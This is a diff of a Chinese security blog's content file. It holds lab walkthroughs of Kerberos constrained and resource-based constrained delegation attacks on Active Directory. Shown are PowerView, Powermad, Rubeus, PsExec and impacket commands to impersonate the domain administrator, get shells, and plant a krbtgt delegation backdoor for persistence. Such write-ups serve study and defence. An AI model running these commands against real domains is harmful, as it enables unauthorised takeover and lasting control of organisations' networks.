-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161255297.png" class title="image-20220318161255297">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161307765.png" class title="image-20220318161307765">
-
-
-
-<p>cifs是文件共享，还需要导入host服务的票据才能psexec</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161343840.png" class title="image-20220318161343840">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161423491.png" class title="image-20220318161423491">
-
-<p>接下来可以正常用psexec获得一个shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\PC2 -s cmd</span><br><span class="line">Python3 getSt.py -dc-ip 192.168.93.40 -spn cifs/oa -impersonate Administrator whoamianony.org/whoamianony:win7:win7</span><br></pre></td></tr></table></figure>
-
-<p>使用impacket工具包只要获得一个cifs凭据即可获得PC2的shell</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161609684.png" class title="image-20220318161609684">
-
-<h3 id="解决敏感用户不可委派问题"><a href="#解决敏感用户不可委派问题" class="headerlink" title="解决敏感用户不可委派问题"></a>解决敏感用户不可委派问题</h3><p>利用条件：知道目标的主机账户的凭证</p>
-<p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318144136403.png" class title="image-20220318144136403">
-
-
-
-<p>清除票据</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162000613.png" class title="image-20220318162000613">
-
-<p>此时再去申请票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt &gt; log.txt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162252245.png" class title="image-20220318162252245">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162307877.png" class title="image-20220318162307877">
-
-<p>当账户不可委派以及受保护组的成员可以完成S4U2Self，可以使用<code>Rubeus describe</code>查看一下S4U2self返回的票据信息，可以看到该票据是没有服务名称的，并且不可转发。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe describe /ticket:申请的票据的base64值</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318174454339.png" class title="image-20220318174454339">
-
-<p>这里可以看到申请的servicename本来应该为cifs&#x2F;PC2（host&#x2F;PC2），但是这里只有win7，这是因为服务名称丢失了，只需要补上就可以了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>
-
-<p>如下（这里我一直使用的是加密后的base64，因为使用kirbi会报莫名其妙的错误）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:请求cifs票据的base64值 /altservice:cifs/PC2.whoamianony.org /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:请求host票据的base64值 /altservice:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
-
-<p>未申请之前</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175059468.png" class title="image-20220318175059468">
-
-
-
-<p>申请之后</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175404412.png" class title="image-20220318175404412">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175630923.png" class title="image-20220318175630923">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318180737281.png" class title="image-20220318180737281">
-
-<p>这里申请host的票据也是一样的步骤，就不再赘述了</p>
-<h3 id="利用基于资源的约束委派进行域权限维持"><a href="#利用基于资源的约束委派进行域权限维持" class="headerlink" title="利用基于资源的约束委派进行域权限维持"></a>利用基于资源的约束委派进行域权限维持</h3><p>主要思想是：在获得域控的管理员权限后，修改krbtgt或是域控的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，加入已知后门账户的SID。</p>
-<p>根据这样基于资源的约束委派攻击生成白银票据的方式进行权限维持</p>
-<p>1、配置注册的主机账号（比如我这里的主机账号是win7）到krbtgt基于资源的约束委派</p>
-<p>2、配置注册的主机账号（比如我这里的主机账号是win7）到域控基于资源的约束委派</p>
-<p>这是windows 版本在2012之下（我的域控是2012的，所以这里选择第二种方法）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Set-DomainObject krbtgt -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
-
-
-
-<p>在windows版本在2012及以上</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318202451168.png" class title="image-20220318202451168">
-
-<p>注意这是做权限维持，这是在域控上操作的</p>
-<p>修改Krbtgt用户的PrincipalsAllowedToDelegateToAccount属性后，我们已经做好了后门了，然后就可以请求TGT</p>
-<p>请求成功！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:krbtgt /ptt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203355644.png" class title="image-20220318203355644">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203411815.png" class title="image-20220318203411815">
-
-<p>然后利用s4u2proxy返回的TGT去申请一张访问域控cifs服务的ST2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgs /user:win7$ /enctype:rc4 /service:cifs/DC /domain:whoamianony.org /ticket:请求的ST2的base64 /ptt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204344841.png" class title="image-20220318204344841">
-
-<p>我不知道为什么这里报了一个小错误，但确实可以请求一个ST访问域控了。请求host服务一样的方法</p>
-<p>这样请求票据只能一个一个请求，用impacket工具包会方便很多</p>
-<p>这里先删除票据</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204546537.png" class title="image-20220318204546537">
-
-
-
-<p>使用impacket工具，这里我不知道为什么一直无法将票据进行设置，原理是没错的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getst_windows.exe -dc-ip 192.168.93.30 -spn krbtgt -impersonate Administrator whoamianony.org/win7$:win7</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=Administrator.ccache</span><br><span class="line">wmiexec.exe -no-pass -k DC</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="在域外进行基于资源的约束委派攻击"><a href="#在域外进行基于资源的约束委派攻击" class="headerlink" title="在域外进行基于资源的约束委派攻击"></a>在域外进行基于资源的约束委派攻击</h3><p>SharpAllowedToAct可以自动生成机器账户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m hacker -p hacker -t PC2 -a 192.168.93.30 whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223625113.png" class title="image-20220318223625113">
-
-<p>可以看到确实生成了用户</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223702223.png" class title="image-20220318223702223">
-
-
-
-<p>获得服务票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.93.30 whoamianony/hacker\$:hacker -spn cifs/PC2.whoamianony.org -impersonate administrator</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318224914156.png" class title="image-20220318224914156">
-
-<p>将票据导入内存</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
-
-
-
-<p>直接连接目标机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k PC2.whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318232610317.png" class title="image-20220318232610317">
-
-<p>这里有个坑，要在&#x2F;etc&#x2F;hosts下手动把PC2.whoamianony.org解析成192.168.93.40</p>
-<p>impacket工具包里面的脚本是可以完成基于资源的约束委派的攻击的，这里就不再研究了，原理都是一样的，只是使用的脚本方法不一样。</p>
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>约束委派的原理及利用</title>
     <url>/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>非约束性委派被委派的机器会直接得到发布委派的用户的TGT，是十分不安全的，因此微软推出了约束性委派，添加了s4u2self与s4u2proxy协议，以增加安全性。假设有这么一种情况，用户A委派service1去访问service2,那么大概的访问过程如下：</p>
@@ -626,8 +140,8 @@
 
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142022983.png" class title="image-20220317142022983">
 
-<p>这里的tgt是第一次向kdc申请的ST1</p>
-<p>使用请求到的tgt进行s4uproxy伪造请求ST2</p>
+<p>这里的tgt是PC2向kdc请求的自己可转发的票据，不是ST1</p>
+<p>使用请求到的tgt通过s4u协议伪造请求ST1，ST2</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_PC2$@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
 
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142437649.png" class title="image-20220317142437649">
@@ -637,7 +151,7 @@
 <p>未进行ptt之前是不能访问DC的 </p>
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142727658.png" class title="image-20220317142727658">
 
-<p>使用mimikatz进行ptt,注意tgs别选错了</p>
+<p>使用mimikatz进行ptt,注意票据别选错了，要选经过s4u2proxy协议提供的可转发的ST2</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
 
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142746120.png" class title="image-20220317142746120">
@@ -1056,6 +570,492 @@
       </categories>
       <tags>
         <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于资源的约束委派</title>
+    <url>/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于资源的约束委派（RBCD）是在windows server 2012中加入的新功能，与普通的约束委派不同，它不需要域管理员去设置相关属性。但是请求ST的过程和约束委派过程大同小异，RBCD把设置委派的权限赋给了机器本身，机器可以决定谁可以被委派来控制自身。更理论一点就是传统的约束委派S4U2Self返回的票据（ST1）一定是可转发的，如果不可转发那么S4U2Proxy将失败；但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据（ST2）总是可转发。</p>
+<p>这里引用Elad的思维导图（<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html%EF%BC%89">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html）</a></p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318090529465.png" class title="image-20220318090529465">
+
+<p>从图中可以看出，基于资源的约束委派与传统的约束委派非常相似，但工作方向相反。从帐户 A （例如上一篇文章的DC）到帐户 B 的传统约束委派在帐户 A 的 msDS-AllowedToDelegateTo 属性中配置，并定义从 A 到 B 的“传出”信任，而基于资源的约束委派在帐户 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置，并定义了从 A 到 B 的“传入”信任。 </p>
+<h1 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h1><h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><ul>
+<li>域：whoamianony.org</li>
+<li>域控： 192.168.93.30，主机名DC，Windows Server 2012R2</li>
+<li>域成员： 192.168.93.40，主机名PC2，Windows 7 专业版</li>
+<li>用户bunny对PC2有写权限</li>
+</ul>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318145144632.png" class title="image-20220318145144632">
+
+<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>验证bunny这个用户是否对PC2有写权限，用pwerview枚举，PC2.whoamianony.org中的特定ACE（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainUser -Identity bunny -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity PC2  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-1315137663-3706837544-1429009142-1112&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151625486.png" class title="image-20220318151625486">
+
+<p>bunny对主机PC2有写入权限，其实不一定要GenericWrite，WriteProperty，WriteDacl都可以，当然最好的是GenericAll（完全控制权）</p>
+<p>现在需要一个具有SPN的账号，因为s4uself只适用于具有SPN的账户，我们的目的是在之后通过s4uproxy协议代替用户发起请求，而s4uproxy是根据kerberos发起请求的，SPN是一种服务主体名称，域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN。恰好域中有一个属性MachineAccountQuota，这个值表示允许用户在域中创建的计算机账户数，默认为10。我们创建的账户默认注册在<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN之下。因此我们可以利用。</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318100656209.png" class title="image-20220318100656209">
+
+
+
+<p>使用powermad中的New-MachineAccount注册一个计算机用户win7，密码为win7</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount win7 -Domain whoamianony.org -DomainController DC.whoamianony.org -Verbose</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151835228.png" class title="image-20220318151835228">
+
+
+
+<p>查看是否添加成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151858125.png" class title="image-20220318151858125">
+
+
+
+<p>查看spn票据，能添加成功机器账号肯定是有spn的，但还是可以查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn —q */* | findstr &quot;win7&quot;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151956537.png" class title="image-20220318151956537">
+
+
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131103230.png" class title="image-20220318131103230">
+
+<p>这是新添加的win7的机器用户  </p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131156113.png" class title="image-20220318131156113">
+
+<p>这是要修改的属性，根据微软官方文档的解释，此属性用于访问检查以确定请求者是否有权代表其他身份对以此帐户运行的服务进行操作。<strong>注：这里截图截错了应该是看PC2的msDS-AllowedToActOnBehalfOfOtherIdentity的值为未设置</strong></p>
+<p>修改PC2的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值，有两种方法</p>
+<p><strong>一、powerview脚本</strong></p>
+<p>首先使用pwerview脚本查看机器账户win7的sid</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetComputer -Identity win7</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152113521.png" class title="image-20220318152113521">
+
+
+
+<p>然后配置win7到PC2的基于资源约束的委派（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer PC2| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152253325.png" class title="image-20220318152253325">
+
+
+
+<p>验证是否成功添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer PC2 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
+
+<p>不为空就修改成功</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152406051.png" class title="image-20220318152406051">
+
+<p>在域控上查看msds-allowedtoactonbehalfofotheridentity的值可以看到是字节数组，所以不能直接用字符串型</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318132830587.png" class title="image-20220318132830587">
+
+
+
+<p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject PC2 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>
+
+<p><strong>二、通过ActiveDirectory模块添加</strong></p>
+<p>只有Windows Server 2012以及以上的ActiveDirectory模块才有-PrincipalsAllowedToDelegateToAccount选项，域内普通主机是不存在ActiveDirectory模块的，但是可以将DLL文件复制出来，然后导入即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer PC2 -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADComputer PC2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318133951958.png" class title="image-20220318133951958">
+
+<p>这里已经添加过了，就不再演示了</p>
+<h2 id="进行攻击"><a href="#进行攻击" class="headerlink" title="进行攻击"></a>进行攻击</h2><h3 id="典型的基于资源约束委派攻击"><a href="#典型的基于资源约束委派攻击" class="headerlink" title="典型的基于资源约束委派攻击"></a>典型的基于资源约束委派攻击</h3><p>现在没有票据是肯定无法访问PC2的</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318155719648.png" class title="image-20220318155719648">
+
+
+
+<p>rubeus是不支持明文密码的，先将创建的机器用户的密码转换成hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:win7 /password:win7 /domain:whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318153253944.png" class title="image-20220318153253944">
+
+
+
+<p>然后用win7的rc4  hash值请求一个可转发的票据（相当于白银票据），并且导入到内存中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161255297.png" class title="image-20220318161255297">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161307765.png" class title="image-20220318161307765">
+
+
+
+<p>cifs是文件共享，还需要导入host服务的票据才能psexec</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161343840.png" class title="image-20220318161343840">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161423491.png" class title="image-20220318161423491">
+
+<p>接下来可以正常用psexec获得一个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\PC2 -s cmd</span><br><span class="line">Python3 getSt.py -dc-ip 192.168.93.40 -spn cifs/oa -impersonate Administrator whoamianony.org/whoamianony:win7:win7</span><br></pre></td></tr></table></figure>
+
+<p>使用impacket工具包只要获得一个cifs凭据即可获得PC2的shell</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161609684.png" class title="image-20220318161609684">
+
+<h3 id="解决敏感用户不可委派问题"><a href="#解决敏感用户不可委派问题" class="headerlink" title="解决敏感用户不可委派问题"></a>解决敏感用户不可委派问题</h3><p>利用条件：知道目标的主机账户的凭证</p>
+<p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318144136403.png" class title="image-20220318144136403">
+
+
